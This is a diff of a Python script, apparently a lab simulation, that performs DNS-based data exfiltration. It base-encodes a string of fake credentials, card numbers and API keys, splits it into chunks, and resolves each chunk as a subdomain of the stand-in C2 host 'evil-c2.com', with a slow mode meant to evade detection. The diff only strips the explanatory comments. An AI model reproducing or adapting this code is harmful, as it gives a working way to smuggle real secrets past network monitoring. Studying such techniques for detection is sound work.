@@ -6,7 +6,7 @@ import random
 # Attacker ka C2 server (fake)
 C2_DOMAIN = "evil-c2.com"
 
-# Fake sensitive data jo attacker chura raha hai
+
 SENSITIVE_DATA = "username=admin&password=SuperSecret123&creditcard=4111111111111111&ssn=123-45-6789&internal_api_key=sk-prod-abc123xyz789&db_password=Pr0d@DB#2026&aws_secret=wJalrXUtnFEMI/K7MDENG&employee_records=raj.sharma@helix.com,priya.mehta@helix.com,amit.verdi@helix.com"
 
 def encode_chunk(data):
@@ -22,9 +22,9 @@ def simulate_exfiltration(speed="normal"):
     chunks = split_into_chunks(SENSITIVE_DATA)
 
     delays = {
-        "fast":   0.1,   # Fast attack — easy to detect
-        "normal": 0.5,   # Normal attack
-        "slow":   3.0    # Slow attack — harder to detect
+        "fast":   0.1,   
+        "normal": 0.5,   
+        "slow":   3.0    
     }
     delay = delays.get(speed, 0.5)
 
@@ -33,10 +33,10 @@ def simulate_exfiltration(speed="normal"):
         subdomain = f"{encoded}.{C2_DOMAIN}"
 
         try:
-            # Actual DNS query bhejo
+            
             socket.gethostbyname(subdomain)
         except:
-            # Domain exist nahi karta — but DNS query gayi ✅
+           
             pass
 
         print(f"[ATTACKER] Chunk {i+1}/{len(chunks)} sent: {subdomain}")
